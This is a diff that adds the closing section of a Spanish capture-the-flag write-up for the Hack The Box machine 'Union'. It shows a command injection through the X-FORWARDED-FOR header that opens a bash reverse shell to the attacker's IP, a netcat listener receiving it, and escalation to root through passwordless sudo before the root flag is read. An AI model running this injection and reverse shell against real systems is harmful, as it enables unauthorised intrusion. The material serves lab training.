@@ -322,18 +322,60 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 Vemos que recibimos la traza ICMP correctamente a nuestro equipo, asique procedemos a intentar enviarnos una revershell a nuestro equip:
 
 ```bash
-
-
-
+GET /firewall.php HTTP/1.1
+Host: 10.10.11.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.11.128/challenge.php
+Connection: close
+Cookie: PHPSESSID=vtlolo0qm5uig3et8q279q9ico
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+X-FORWARDED-FOR: ; ping -c 1 10.10.16.7 && bash -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"
 ```
 
+ Nos ponemos a la escucha con una session de Netcat en Nuestro Equipo para Recibir la conexion entrante.
 
+ ```bash
+ nc -vlnp 443                                                                                                                       1 ⨯ 1 ⚙
+listening on [any] 443 ...
+connect to [10.10.16.7] from (UNKNOWN) [10.10.11.128] 58324
+bash: cannot set terminal process group (848): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@union:~/html$
+```
 
+Vemos que entramos como el `www-data` , enumeramos el sistema para ver como podemos escalar privilegios
 
+```bash
+www-data@union:~/html$ sudo -l
+Matching Defaults entries for www-data on union:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User www-data may run the following commands on union:
+    (ALL : ALL) NOPASSWD: ALL
+```
 
+Vemos que podemos convertirnos en administradores
 
+```bash
+www-data@union:~/html$ sudo -u root /bin/bash
+root@union:/var/www/html#
+```
 
+Sacamos la Flag Para ROOT
+
+```bash
+root@union:/var/www/html# cat /root/root.txt 
+7a97deabcc2cef8768d711dxxxxxxxx
+```
+
+Maquina Union - SQLI - Code Injection - Pwned 
+
+K0H4ck
 
 
 
